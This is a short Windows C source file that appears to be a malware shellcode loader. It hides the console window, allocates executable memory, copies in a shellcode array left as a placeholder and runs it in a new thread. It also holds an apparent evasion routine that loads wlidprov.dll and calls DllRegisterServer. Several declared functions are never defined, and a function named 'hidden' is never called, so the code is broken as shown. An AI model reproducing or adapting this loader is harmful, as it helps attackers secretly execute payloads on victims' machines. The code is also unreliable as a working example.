#include <windows.h>

void _bypass();

void _runProcAddress(FARPROC address);

DWORD _wrapper();

int start();

void hiddenConsole();

int main()
{
	DWORD ret = _wrapper();
	if (ret == 10) 
	{
		int success = start();
		return success;
	}
	
	return 0;
}


void _bypass() 
{
	HMODULE hModule = LoadLibraryA("C:\\Windows\\System32\\wlidprov.dll");
    FARPROC procAddress = GetProcAddress(hModule, "DllRegisterServer");
	_runProcAddress(procAddress);
}

void hidden()
{
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL); 																	  
	ShowWindow(window, 0);
}


int start() 
{
	hiddenConsole();
	unsigned char shellcode[] = {
		//SHELLCODE HERE
	};


	PVOID addressReserveMemory  = VirtualAlloc(
		0, 
		sizeof(shellcode), 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_EXECUTE_READWRITE
	);

	if (addressReserveMemory == NULL) 
	{
		return 1;
	}

	CopyMemory(addressReserveMemory, shellcode, sizeof(shellcode));
	HANDLE thread = CreateThread(
		NULL, 
		0, 
		(LPTHREAD_START_ROUTINE)addressReserveMemory, 
		NULL, 
		0, 
		0
	);

	if (thread == NULL)
	{
		return 1;
	}

	WaitForSingleObject(thread, INFINITE);
	CloseHandle(thread);
	return 0;
}